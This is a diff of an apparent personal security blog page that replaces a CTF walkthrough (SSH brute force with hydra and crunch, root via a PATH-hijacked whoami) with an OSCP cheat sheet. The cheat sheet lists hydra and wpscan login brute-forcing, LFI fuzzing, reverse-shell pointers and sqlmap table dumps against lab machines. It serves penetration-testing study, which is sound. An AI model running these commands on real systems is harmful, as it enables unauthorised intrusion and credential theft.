@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF Silky 0x01 | Peanutstick</title>
+  <title>cheat sheet for the OSCP | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="CTF Silky 0x01 | Peanutstick">
+  <meta name="description" content="cheat sheet for the OSCP | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="First ennumerationPingIf the TTL is at 64 it’s linux, if it’s 128 or 32 it’s windows.https:&#x2F;&#x2F;subinsb.com&#x2F;default-device-ttl-values&#x2F; Nmap-A: OS detection-sV: Version-script&#x3D;: vulnerability check nmap -">
 <meta property="og:type" content="article">
@@ -1095,9 +1095,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CTF_Silky_0x01" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Cheat sheet" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF Silky 0x01</h1>
+        <h1 class="article-title">cheat sheet for the OSCP</h1>
     
     <div class="article-meta">
         
@@ -1107,7 +1107,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="CTF">CTF</a>
+            <a  data-rel="Tips">Tips</a>
             
         </span>
         
@@ -1122,12 +1122,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-09-27 09:49:09'>2022-06-12 18:44</time>
+            Created At : <time class="date" title='Updated At: 2023-02-07 12:26:28'>2023-02-07 03:09</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:210</span>
+        <span>Count:608</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1146,7 +1146,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rustscan"><span class="toc-text">rustscan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gobuster"><span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Wordlist"><span class="toc-text">Wordlist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hydra"><span class="toc-text">Hydra</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lse"><span class="toc-text">lse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#usr-bin-sky"><span class="toc-text">&#x2F;usr&#x2F;bin&#x2F;sky</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#First-ennumeration"><span class="toc-text">First ennumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ping"><span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Subdomain"><span class="toc-text">Subdomain</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Plugins"><span class="toc-text">Plugins</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#List-subdomain"><span class="toc-text">List subdomain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Directory-listing"><span class="toc-text">Directory listing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wordpress"><span class="toc-text">Wordpress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-text">LFI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Brute-force"><span class="toc-text">Brute force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hydra"><span class="toc-text">Hydra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wpscan"><span class="toc-text">wpscan</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Revershell"><span class="toc-text">Revershell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Generator"><span class="toc-text">Generator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-text">Metasploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privesc"><span class="toc-text">Privesc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum"><span class="toc-text">Enum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sudo"><span class="toc-text">Sudo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setuid-Guid"><span class="toc-text">Setuid Guid</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-bash-filter"><span class="toc-text">Bypass bash filter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pivot"><span class="toc-text">Pivot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-tunneling"><span class="toc-text">Web tunneling</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap"><span class="toc-text">SQLMap</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1162,39 +1162,90 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><p><img src="https://i.imgur.com/rVvJcAI.png"><br>192.168.0.12</p>
-<h1 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rustscan -a <span class="token number">192.168</span>.0.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/MAbyiYb.png"></p>
-<h1 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/Ugr6CbZ.png"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><a href="http://192.168.0.12/notes.txt">http://192.168.0.12/notes.txt</a></p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">Ich muss unbedingt das Passwort aus der Seite entfernen, immerhin fehlen die letzten 2 Zeichen. Aber trotzdem.
+        <h1 id="First-ennumeration"><a href="#First-ennumeration" class="headerlink" title="First ennumeration"></a>First ennumeration</h1><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p>If the TTL is at <code>64</code> it’s linux, if it’s <code>128</code> or <code>32</code> it’s windows.<br><a href="https://subinsb.com/default-device-ttl-values/">https://subinsb.com/default-device-ttl-values/</a></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>-A: OS detection<br>-sV: Version<br>-script=: vulnerability check</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -sV -p- -script<span class="token operator">=</span>vuln <span class="token number">10.10</span>.177.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-I really need to remove the password from the page, after all the last 2 characters are missing. But still.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>view-source:<a href="http://192.168.0.12/script.js">http://192.168.0.12/script.js</a><br>//  s1lKy</p>
-<h1 id="Wordlist"><a href="#Wordlist" class="headerlink" title="Wordlist"></a>Wordlist</h1><p>So the password should be at 7 charachters.<br>Let’s create a wordlist with <code>crunch</code>.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">7</span> <span class="token number">7</span> -t s1lKy^% <span class="token operator">></span> pass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l silky -P pass <span class="token number">192.168</span>.0.12 -t <span class="token number">10</span> -V <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/wZvIbiA.png"></p>
-<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ssilky@192.168.0.12
-s1lKy<span class="token comment">#5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h1 id="lse"><a href="#lse" class="headerlink" title="lse"></a>lse</h1><p><img src="https://i.imgur.com/HWPnhbd.png"></p>
-<p><img src="https://i.imgur.com/i0PgW0K.png"></p>
-<h1 id="usr-bin-sky"><a href="#usr-bin-sky" class="headerlink" title="/usr/bin/sky"></a>/usr/bin/sky</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Output:</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
-gezeichnet:
-root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>-p-: all port<br>-sS: TCP SYN scan, that’s mean no ping, he try to connect directly. Also know as steal<br>-T4: Is the equivalent of –max-rtt-timeout 1250ms –min-rtt-timeout 100ms –initial-rtt-timeout 500ms –max-retries 6 </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- -sV -sS -T4 <span class="token number">10.10</span>.177.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Output:<br><img src="https://i.imgur.com/56vGGmK.png"><br>He use whoami as root, let’s create our own whoami file.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp
-<span class="token builtin class-name">echo</span> <span class="token string">"/bin/sh"</span> <span class="token operator">></span> <span class="token function">whoami</span>
-<span class="token function">chmod</span> +x <span class="token function">whoami</span> 
-<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/tmp:<span class="token environment constant">$PATH</span>"</span>
-/usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/CcmiLzj.png"><br>The flag:<br><img src="https://i.imgur.com/dCn81Wb.png"></p>
+<p>-sU: Scan UDP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -sU --min-rate <span class="token number">100</span> pandora.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Subdomain"><a href="#Subdomain" class="headerlink" title="Subdomain"></a>Subdomain</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> axfr photobomb.htb @photobomb.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><ul>
+<li><a href="https://addons.mozilla.org/fr/firefox/addon/wappalyzer/">https://addons.mozilla.org/fr/firefox/addon/wappalyzer/</a><br><img src="https://i.imgur.com/lhWyDcJ.png"></li>
+</ul>
+<h2 id="List-subdomain"><a href="#List-subdomain" class="headerlink" title="List subdomain"></a>List subdomain</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u <span class="token string">'http://photobomb.htb'</span> -H <span class="token string">"Host: FUZZ.photobomb.htb"</span> --sc <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Directory-listing"><a href="#Directory-listing" class="headerlink" title="Directory listing"></a>Directory listing</h2><p>Wordlists:</p>
+<ul>
+<li>/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</li>
+<li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</li>
+<li>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt</li>
+</ul>
+<p>Gobuster:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://10.10.227.219/. -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>Check <code>robots.txt</code> file.<br>Check the source code (ctrl+u).</p>
+<h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.0.24/wordpress/ --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
+<li><a href="https://github.com/payloadbox/ssti-payloads">https://github.com/payloadbox/ssti-payloads</a><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --sc <span class="token number">200</span> <span class="token string">'http://preprod-marketing.trick.htb/index.php?page=../../../../../../../FUZZ'</span> <span class="token operator">>></span> fli.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h1 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h1><h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>Web</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L fsocity.dic -p admin <span class="token number">10.10</span>.185.72 -V http-form-post <span class="token string">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.185.72%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ssh</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l silky -P pass <span class="token number">192.168</span>.0.12 -t <span class="token number">10</span> -V <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan -v -U user.txt -P fsocity.dic.sort --url http://10.10.185.72/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Revershell"><a href="#Revershell" class="headerlink" title="Revershell"></a>Revershell</h1><h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><ul>
+<li><a href="https://www.revshells.com/">https://www.revshells.com/</a></li>
+<li>Listen with nc -nlvp $port</li>
+</ul>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><ul>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom">https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom</a></li>
+</ul>
+<h1 id="Privesc"><a href="#Privesc" class="headerlink" title="Privesc"></a>Privesc</h1><h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><p>LinPEAS</p>
+<ul>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></li>
+</ul>
+<p>linux-smart-enumeration</p>
+<ul>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
+</ul>
+<p>Search for passwords in files.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> --color<span class="token operator">=</span>auto -rnw <span class="token string">'.'</span> -ie <span class="token string">"password"</span> --color<span class="token operator">=</span>always <span class="token operator"><span class="token file-descriptor important">2</span>></span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><ul>
+<li><code>sudo -l</code></li>
+<li><a href="https://gtfobins.github.io/gtfobins">https://gtfobins.github.io/gtfobins</a></li>
+</ul>
+<h2 id="Setuid-Guid"><a href="#Setuid-Guid" class="headerlink" title="Setuid Guid"></a>Setuid Guid</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -user root -perm -4000 -exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h1 id="Bypass-bash-filter"><a href="#Bypass-bash-filter" class="headerlink" title="Bypass bash filter"></a>Bypass bash filter</h1><ul>
+<li><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions">https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions</a></li>
+</ul>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Export path:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/tmp:<span class="token environment constant">$PATH</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="Pivot"><a href="#Pivot" class="headerlink" title="Pivot"></a>Pivot</h1><h2 id="Web-tunneling"><a href="#Web-tunneling" class="headerlink" title="Web tunneling"></a>Web tunneling</h2><p>Export the port 80 to get an entry on the port 2500.<br>Have to use it inside the box.</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh -f daniel@pandora.htb -L 2500:localhost:80 -N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h1><p>Display the tables.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token string">"http://localhost:2500/pandora_console/include/chart_generator.php?session_id=''"</span> -D pandora --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token string">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> -X POST -H <span class="token string">'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0'</span> -H <span class="token string">'Accept: */*'</span> -H <span class="token string">'Accept-Language: en-US,en;q=0.5'</span> -H <span class="token string">'Accept-Encoding: gzip, deflate'</span> -H <span class="token string">'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'</span> -H <span class="token string">'X-Requested-With: XMLHttpRequest'</span> -H <span class="token string">'Origin: http://preprod-payroll.trick.htb'</span> -H <span class="token string">'Connection: keep-alive'</span> -H <span class="token string">'Referer: http://preprod-payroll.trick.htb/login.php'</span> -H <span class="token string">'Cookie: PHPSESSID=vle17ll7puj0b1kblu8c40ue3r'</span> --data-raw <span class="token string">'username=fgh&amp;password=fgh'</span> -D payroll_db --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Show the content of the table.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token string">"http://localhost:2500/pandora_console/include/chart_generator.php?session_id=''"</span>  -D pandora -T tpassword_history --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
       
        
